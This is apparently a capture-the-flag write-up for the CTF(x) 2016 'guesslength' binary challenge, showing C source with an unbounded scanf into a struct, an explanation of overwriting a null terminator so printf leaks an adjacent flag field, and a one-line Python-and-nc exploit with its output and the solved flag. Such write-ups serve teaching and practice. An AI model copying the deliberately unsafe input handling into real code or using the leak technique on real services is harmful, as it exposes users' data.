---
title: "CTF(x) 2016 - guesslength (Binary)"
header:
  overlay_image: /assets/images/ctfx2016/guesslength/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Elmira G. on Unsplash"
tags:
  - ctfx2016
  - writeup
  - pwn
---

Overwriting a null byte in a buffer causes printf to print sensitive struct
data.

## Solution

We are given the following source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char input[50];
    int length;
    char flag[50];
} data;

int main()
{
    setbuf(stdout, NULL);
    data d;

    strncpy(d.flag, "REDACTED", sizeof(d.flag));

    printf("Enter your text: ");
    scanf("%s", d.input);

    printf("Guess the length of this text: ");
    scanf("%d", &d.length);

    if (strlen(d.input) == d.length) {
        printf("You guessed the length correctly. Great job!\n");
    } else {
        printf("The actual length of '%s' is %ld, not %d. Sorry :(\n", d.input, strlen(d.input), d.length);
    }

    return 0;
}
```

There is an obvious buffer overflow when the scanf reads an unbounded amount of
data into the struct. However, we don't want to overflow too much or we will
overwrite the flag that is stored in the struct. Our solution is to write just
enough to get the null byte within the four bytes that make up the length field
and then ensure that the packed representation of the length we provide does not
include a null byte to leak the flag.

The exploit is a one liner:

```shell
amon@Evanna:~/ctf/ctfx/binary/guesslength$ python -c 'print "A"*52 + "\n" + str(0x0a0a0a0a)' | nc problems.ctfx.io 1338
Enter your text: Guess the length of this text: The actual length of 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA



ctf(hiding_behind_a_null_overwrite)' is 91, not 168430090. Sorry :(
```

Flag: **ctf(hiding\_behind\_a\_null\_overwrite)**
